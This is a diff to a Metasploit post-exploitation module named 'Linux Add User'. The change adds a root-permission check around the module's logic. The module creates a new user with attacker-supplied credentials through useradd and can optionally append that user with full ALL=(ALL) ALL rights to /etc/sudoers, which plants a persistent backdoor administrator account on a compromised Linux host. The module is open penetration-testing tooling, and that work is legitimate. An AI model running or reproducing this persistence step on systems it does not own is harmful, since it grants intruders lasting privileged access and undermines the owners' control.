@@ -23,7 +23,7 @@ class Metasploit3 < Msf::Post
 		super( update_info( info,
 				'Name'          => 'Linux Add User',
 				'Description'   => %q{
-					This module adds a user to the system. NOTE: this module does not create a homedir for the user.
+					This module adds a user to the system. Requires: root permissions. NOTE: this module does not create a homedir for the user.
 				},
 				'License'       => MSF_LICENSE,
 				'Author'        =>
@@ -43,13 +43,19 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
-		vcmd_exec("useradd #{datastore['USER']} -p #{datastore['PASS']} ")
+		if is_root?
+			vcmd_exec("useradd #{datastore['USER']} -p #{datastore['PASS']} ")
 
-		#
-		# NOTE: We are intentionally not creating a homedir for the user
-		#
-		if datastore['SUDO'] == true
-			vcmd_exec("echo '#{datastore['USER']}	ALL=(ALL) ALL' >> /etc/sudoers ")
+			#
+			# NOTE: We are intentionally not creating a homedir for the user
+			#
+			if datastore['SUDO'] == true
+				vcmd_exec("echo '#{datastore['USER']}	ALL=(ALL) ALL' >> /etc/sudoers ")
+			end
+
+		else
+			print_error("This module require root permissions")
+			return
 		end
 	end
 end
